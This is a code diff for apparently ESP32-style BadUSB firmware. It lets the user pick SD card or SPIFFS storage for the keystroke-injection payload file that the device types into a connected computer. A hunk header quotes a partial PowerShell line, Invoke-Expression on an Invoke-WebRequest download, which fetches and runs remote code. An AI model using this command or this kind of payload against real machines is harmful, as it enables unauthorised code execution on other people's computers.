@@ -36,11 +36,11 @@ STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.
 
 */
 
-void key_input(String bad_script) {
+void key_input(FS fs, String bad_script) {
   delay(1000);
 
-  if (SD.exists(bad_script) && bad_script!="") {
-    File payloadFile = SD.open(bad_script, "r");
+  if (fs.exists(bad_script) && bad_script!="") {
+    File payloadFile = fs.open(bad_script, "r");
     if (payloadFile) {
       tft.setCursor(0, 40);
       tft.println("from file!");
@@ -222,9 +222,20 @@ void usb_setup() {
   Serial.println("BadUSB begin");
   tft.fillScreen(BGCOLOR);
   String bad_script = "";
-
   bad_script = "/badpayload.txt";
-  bad_script = loopSD(true);
+
+  FS *fs;
+  if(SD.begin()) {
+    bool teste=false;
+    options = {
+      {"SD Card", [&]()  { fs=&SD; }}, 
+      {"Spiffs", [&]()   { fs=&SPIFFS; }},
+    };
+    delay(200);
+    loopOptions(options,false,true,"Radio Frequency");
+  } else fs=&SPIFFS;
+
+  bad_script = loopSD(*fs,true);
   tft.fillScreen(BGCOLOR);
   drawMainMenu(4);
 
@@ -246,7 +257,7 @@ void usb_setup() {
   USB.begin();
 
   delay(2000);
-  key_input(bad_script);
+  key_input(*fs, bad_script);
 
   displayRedStripe("Payload Sent",TFT_WHITE, FGCOLOR);
   checkSelPress();
